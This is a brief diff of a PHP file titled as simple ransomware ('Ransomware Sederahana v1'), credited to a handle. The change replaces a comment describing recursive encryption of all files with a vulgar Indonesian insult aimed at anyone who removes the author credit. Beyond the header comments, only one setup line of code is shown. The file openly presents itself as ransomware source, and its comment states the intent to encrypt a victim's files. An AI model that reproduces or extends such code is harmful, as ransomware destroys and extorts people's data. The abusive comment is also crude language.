@@ -1,6 +1,6 @@
 <?php
 // Ransomware Sederahana v1
-// Encrypt semua file kecuali file penting (auto scan recursive + UI elegan)
+// Encrypt semua file kecuali file penting (Delete author gabikin kau pro kontol)
 // by 0x6ick-6ickZone
 
 set_time_limit(0);
